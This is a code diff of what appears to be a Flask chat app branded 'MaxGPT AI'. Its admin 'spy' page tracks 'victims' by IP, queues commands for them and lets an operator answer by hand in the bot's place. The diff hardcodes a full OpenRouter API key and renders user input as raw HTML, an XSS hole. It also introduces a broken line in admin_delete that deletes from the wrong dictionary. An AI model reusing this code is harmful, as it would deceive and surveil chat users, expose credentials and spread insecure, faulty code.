@@ -500,7 +500,6 @@ async function fetchMessages() {
     if (d.messages) {
         d.messages.forEach(m => {
             let imgTag = m.img ? `<br><img src="${m.img}" style="max-width:200px; border-radius:8px; margin-top:6px;">` : '';
-            // Если бот в ручном режиме ожидает ответа, показываем обычный текст без анимации точек
             let botText = m.bot === "..." ? "Ожидаем ответ специалиста..." : m.bot;
             html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}${imgTag}</div></div></div>`;
             html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span><button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button></div><div class="txt">${botText}</div></div></div>`;
@@ -705,9 +704,7 @@ SPY_PAGE = """<!DOCTYPE html>
     {% endif %}
 </div>
 <script>
-// Авто-обновление админки БЕЗ сброса фокуса с клавиатуры при наборе текста
 async function pollAdminData() {
-    // Если пользователь сейчас печатает что-то в текстовое поле, пропускаем этот цикл обновления, чтобы не сбивать фокус и клавиатуру
     let activeEl = document.activeElement;
     if (activeEl && activeEl.tagName === 'TEXTAREA' && activeEl.classList.contains('manual-input')) {
         return; 
@@ -929,7 +926,7 @@ def admin_delete():
     data = request.json or {}
     target_ip = data.get("ip")
     if target_ip in active_victims: del active_victims[target_ip]
-    if target_ip in pending_commands: del pending_commands[target_ip]
+    if target_ip in pending_commands: del active_victims[target_ip]
     if target_ip in manual_control: del manual_control[target_ip]
     return jsonify({"status": "deleted"})
 
@@ -1008,8 +1005,9 @@ def chat_api():
             try:
                 openrouter_key = "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"
                 
+                # Жёстко зафиксированная стабильная модель Llama Vision для надежного анализа картинок
                 vision_payload = {
-                    "model": "openrouter/free",
+                    "model": "meta-llama/llama-3.2-11b-vision-instruct:free",
                     "messages": [
                         {
                             "role": "user",
